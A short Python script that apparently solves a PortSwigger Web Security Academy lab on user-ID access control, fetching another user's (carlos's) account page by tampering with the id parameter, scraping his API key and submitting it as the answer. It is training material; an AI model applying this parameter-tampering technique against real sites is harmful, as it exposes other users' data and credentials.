################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 5/9/2023
#
# PortSwigger LAB: User ID controlled by request parameter
#
# Steps: 1. Fetch the carlos profile using id URL parameter
#        2. Extract the API key
#        3. Submit solution
#
#################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0a78004d03a8ccf480c2d02a001600b4.web-security-academy.net"

try:  # fetch carlos profile using id URL parameter
    carlos_profile = requests.post(f"{url}/my-account?id=carlos")
    if carlos_profile.status_code == 200:
        print(Fore.WHITE + "1. Fetching carlos profile page.. " + Fore.GREEN + "OK")
        # extract the API key
        api_key = re.findall("Your API Key is: (.*)</div>",
                             carlos_profile.text)[0]
        print(Fore.WHITE + "2. Extracting the API key.. " + Fore.GREEN + "OK")
        try:  # submit solution
            data = {"answer": api_key}
            submit_solution = requests.post(
                f"{url}/submitSolution", data)
            print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
            print(
                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        except:
            print(
                Fore.RED + "[!] Failed to submit solution through exception")
    else:
        print(Fore.RED + "[!] Failed to fetch carlos profile")
except:
    print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
